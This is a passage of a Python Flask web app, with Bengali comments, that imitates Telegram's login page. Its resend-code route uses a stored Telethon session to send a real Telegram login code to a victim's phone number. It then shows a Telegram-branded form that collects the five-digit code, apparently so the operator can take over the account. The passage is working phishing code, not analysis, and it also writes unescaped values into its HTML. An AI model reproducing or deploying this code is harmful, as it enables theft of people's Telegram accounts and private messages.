@app.route('/resend-code', methods=['GET'])
async def resend_code():
    if 'telegram_client' not in session or 'phone_number' not in session:
        return render_page('''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2> Verify Expired</h2>
            <p class="subtitle">Your Verification has expired. Please start over.</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Again</a>
        </div>
        ''')
    
    # ক্লায়েন্ট পুনরুদ্ধার করুন
    client = TelegramClient(StringSession(session['telegram_client']), api_id, api_hash)
    await client.connect()
    
    try:
        # নতুন কোড পাঠান
        sent = await client.send_code_request(session['phone_number'])
        session['phone_code_hash'] = sent.phone_code_hash
        
        # OTP পৃষ্ঠায় ফিরে যান
        content = f'''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Verification Code</h2>
            <p class="subtitle">We've sent a new code to the phone {session['phone_number']}.</p>
            
            <form id="otpForm" action="/verify-otp" method="post">
                <div class="code-input-wrapper">
                    <input type="text" id="code1" name="code1" maxlength="1" oninput="moveToNext(this, 'code2')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code2" name="code2" maxlength="1" oninput="moveToNext(this, 'code3')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code3" name="code3" maxlength="1" oninput="moveToNext(this, 'code4')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code4" name="code4" maxlength="1" oninput="moveToNext(this, 'code5')" onkeyup="handlePaste(event)" autocomplete="off">
                    <input type="text" id="code5" name="code5" maxlength="1" oninput="moveToNext(this, '')" onkeyup="handlePaste(event)" autocomplete="off">
                </div>
                
                <p class="code-info">Didn't get the code? <a href="/resend-code">Resend code</a></p>
                
                <button type="submit" class="primary-btn">Verify</button>
            </form>
            
            <button class="secondary-btn" onclick="window.location.href='/'">Change Phone Number</button>
        </div>
        
        <script>
            function moveToNext(current, nextFieldId) {{
                if (current.value.length === 1) {{
                    if (nextFieldId !== '') {{
                        document.getElementById(nextFieldId).focus();
                    }}
                }}
            }}
            
            function handlePaste(event) {{
                // Ctrl+V বা Cmd+V চেপেছেন কিনা চেক করুন
                if ((event.ctrlKey || event.metaKey) && event.key === 'v') {{
                    // পেস্ট ইভেন্ট হওয়ার জন্য একটু দেরি করুন
                    setTimeout(function() {{
                        // সমস্ত ইনপুট ফিল্ড থেকে মান সংগ্রহ করুন
                        const code1 = document.getElementById('code1').value;
                        const code2 = document.getElementById('code2').value;
                        const code3 = document.getElementById('code3').value;
                        const code4 = document.getElementById('code4').value;
                        const code5 = document.getElementById('code5').value;
                        
                        // সমস্ত মান একত্রিত করুন
                        const fullCode = code1 + code2 + code3 + code4 + code5;
                        
                        // যদি পেস্ট করা কোড 5 অক্ষরের হয়, তাহলে এটি আলাদা করুন
                        if (fullCode.length === 5) {{
                            document.getElementById('code1').value = fullCode[0];
                            document.getElementById('code2').value = fullCode[1];
                            document.getElementById('code3').value = fullCode[2];
                            document.getElementById('code4').value = fullCode[3];
                            document.getElementById('code5').value = fullCode[4];
                            document.getElementById('code5').focus();
                        }}
                    }}, 10);
                }}
            }}
            
            // OTP পেস্ট করার জন্য বিশেষ হ্যান্ডলার
            document.addEventListener('DOMContentLoaded', function() {{
                const inputs = document.querySelectorAll('.code-input-wrapper input');
                
                inputs.forEach((input, index) => {{
                    input.addEventListener('paste', function(e) {{
                        e.preventDefault();
                        const pastedData = e.clipboardData.getData('text');
                        
                        if (pastedData.length === 5 && /^\\d{{5}}$/.test(pastedData)) {{
                            // OTP কে আলাদা আলাদা ইনপুটে ভাগ করুন
                            for (let i = 0; i < 5; i++) {{
                                inputs[i].value = pastedData[i];
                            }}
                            inputs[4].focus();
                        }}
                    }});
                }});
            }});
        </script>
        '''
        
        return render_page(content)
        
    except Exception as e:
        return render_page(f'''
        <div class="login-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
            <h2>Error</h2>
            <p class="subtitle">An error occurred while resending the code: {str(e)}</p>
            <a href="/" class="primary-btn" style="text-decoration: none; display: inline-block;">Try Again</a>
        </div>
        ''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
